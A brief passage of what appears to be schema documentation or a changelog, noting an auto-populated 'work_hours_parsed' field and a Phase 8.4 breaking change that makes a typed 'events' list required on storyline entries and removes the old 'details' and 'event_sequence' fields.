- `work_hours_parsed` is auto-populated from the `work_hours` string if not explicitly provided

**Breaking change (Phase 8.4):** The `events` field on storyline entries is now required. The old `details` dict and `event_sequence` fields have been removed. All storyline entries must use the typed `events` list format.
